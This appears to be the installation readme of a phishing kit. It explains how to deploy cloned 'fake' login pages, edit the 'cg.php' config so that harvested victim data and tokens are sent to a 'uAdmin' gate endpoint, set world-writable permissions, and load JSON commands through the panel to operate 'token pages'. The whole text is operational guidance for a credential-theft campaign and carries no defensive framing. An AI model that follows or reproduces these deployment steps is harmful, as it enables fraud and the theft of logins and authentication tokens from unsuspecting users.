Key words;
 zip           =  zip file you have been recived from me;
 fake          =  cloned web pages
 parent folder =  folder which contain all files, after unzip ;
 cfg           =  file "cg.php" located on 'parent folder';
 uadmin link   =  link to uAdmin panel, for reciving logs from 'fake';
 step          =  single step with html form and inputs/fields collection, used for request information from client;
 777           =  permissions form specific folder/files wich mean xrw-xrw-xrw for all posable users;
 uadmin        =  Universal admin panel
 



-After unzip 'zip' you will see 'parent folder'. Name for this folder can be changed to anything you like. But after all in url you can only have unique folders name.
   good!:
      domen.com/parentfolder/..../login 
      domen.com/anyname/..../login 
      domen.com/sgi/..../login

   not good!:
      domen.com/name/name/..../login
      domen.com/domen/..../login
      domen.com/com/..../login
      domen.com/dome/..../login


-To connect 'fake' to 'uadmin' you have to edit 'cfg' file. 
 Open 'cfg' and fine line with "https://{domain|ip}/uadmin/gates/{token|log}.php" and change {domain|ip} to your domain name or ip.



-Set '777' for 'parent folder'



-To access page over browser you have to open 'parent folder' 
    https://fakedomain.com/*/{parent_folder_name}/       where {parent_folder_name} is name of your 'parent folder' 

-If page is 'token page' than after connect to 'uadmin' 
       -go to token page on uadmin
       -find connected page with green dot
       -press O-Panel on its row
       -press Operations settings
       -press Advanced 
       -empty pop up text box 
       -insert json-formated commands in the bottom of this text file
       -press "save" on pop up box
       -press "save" on current page 
       -go back to o-panel
  after this you will be able to see commands set for current page
